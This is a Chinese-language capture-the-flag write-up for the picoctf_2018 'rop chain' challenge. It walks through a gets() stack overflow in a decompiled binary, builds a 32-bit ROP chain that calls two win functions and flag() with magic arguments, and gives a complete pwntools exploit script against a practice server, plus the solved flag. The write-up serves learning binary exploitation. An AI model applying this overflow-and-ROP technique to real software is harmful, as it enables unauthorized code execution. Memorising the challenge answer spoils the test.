---
tags:
  - BuuCTF
  - 简单
---

# picoctf_2018_rop chain

## 前置工作

先 CheckSec，如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec PicoCTF_2018_rop_chain
[*] '/home/ela/Pwn/PicoCTF_2018_rop_chain'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

开启了 NX，再看看 IDA 怎么说，下面是主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v4; // [esp+Ch] [ebp-Ch]

  setvbuf(_bss_start, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  vuln();
  return 0;
}
```

再看看 `vuln()` 函数

```c
char *vuln()
{
  char s[24]; // [esp+0h] [ebp-18h] BYREF

  printf("Enter your input> ");
  return gets(s);
}
```

溢出点找到了，这个 `gets()`，然后发现还有个函数叫做 `flag()`

```c
int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 48, stream);
  if ( win1 && win2 && a1 == 0xDEADBAAD )
    return printf("%s", s);
  if ( win1 && win2 )
    return puts("Incorrect Argument. Remember, you can call other functions in between each win function!");
  if ( win1 || win2 )
    return puts("Nice Try! You're Getting There!");
  return puts("You won't get the flag that easy..");
}
```

看了看，如果我达成 `win1 && win2 && a1 == 0xDEADBAAD` 就有我想要的了，但是这个 `win1` 和 `win2` 从何得知呢

再仔细看看函数列表，发现有俩函数，一个是 `win_function1()` 还有一个是 `win_function2()`，先看第一个

```c
void win_function1()
{
  win1 = 1;
}
```

挺好，直接赋值了的，就是说我只要调用就可以了

再看看第二个

```c
int __cdecl win_function2(int a1)
{
  int result; // eax

  result = (unsigned __int8)win1;
  if ( win1 && a1 == 0xBAAAAAAD )
  {
    win2 = 1;
  }
  else if ( win1 )
  {
    result = puts("Wrong Argument. Try Again.");
  }
  else
  {
    result = puts("Nope. Try a little bit harder.");
  }
  return result;
}
```

当 `win_function2()` 中的 `a1` 等于 `0xBAAAAAAD` 且 `win1` 存在时，`win2` 可按照我们的预期赋值（注意，这里的 `a1` 和 `flag()` 中的 `a1` 是不一样的）

## ROP 链构造

这就很明确了我要做些啥，我应当先调用 `win_function1()`，然后调用 `win_function2()`，最后调用 `flag()`

刚才 CheckSec 的时候发现这是 32 位程序，也就是说，我们的 ROP 链应该按照这样的模板构造：

***函数地址 + 返回地址 + 参数***

还有一件事，在 x86 中，函数参数通常是从右到左依次入栈的，因此在 ROP 链中你首先要放的是 `flag_func` 的参数，然后是 `win_func1` 的参数

所以我们可以这么写 Payload

```python
payload = b"A"*(0x18+0x4) + p32(win_func1) + p32(win_func2) + p32(flag_func) + p32(win_a1_exp) + p32(flag_a1_exp)
```

## 附总 Exp

```python
from pwn import *

p32 = lambda x: pack(x, 32)

io = remote("node4.buuoj.cn", 27609)

win_func1 = 0x80485CB
win_func2 = 0x80485D8
flag_func = 0x804862B

flag_a1_exp = 0xDEADBAAD
win_a1_exp = 0xBAAAAAAD

payload = b"A"*(0x18+0x4) + p32(win_func1) + p32(win_func2) + p32(flag_func) + p32(win_a1_exp) + p32(flag_a1_exp)
io.sendline(payload)

io.interactive()

```

最后得到的 Flag 是 `flag{879db459-a6fb-4192-8f42-0c4e439cf1bb}`
